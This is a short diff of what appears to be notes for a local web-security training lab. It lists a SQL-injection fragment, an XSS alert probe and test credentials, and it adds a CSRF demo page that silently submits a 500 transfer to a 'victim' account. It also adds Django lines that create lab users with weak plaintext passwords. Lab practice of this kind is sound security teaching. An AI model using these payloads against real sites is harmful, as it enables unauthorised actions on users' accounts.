@@ -3,3 +3,19 @@ test:test123
 '--
 <script>alert('XSS!')</script>
 http://127.0.0.1:8000/lab5/?id=0
+
+<html>
+<body>
+  <h1>CSRF Attack Demo</h1>
+  <form action="http://127.0.0.1:8000/lab3/" method="POST">
+    <input type="hidden" name="to_user" value="victim" />
+    <input type="hidden" name="amount" value="500" />
+    <input type="hidden" name="action" value="transfer" />
+    <input type="submit" value="Click me!" />
+  </form>
+</body>
+</html>
+
+from labs.models import User
+User.objects.create(username="alice", password="alice123")
+User.objects.create(username="bob", password="bob123")
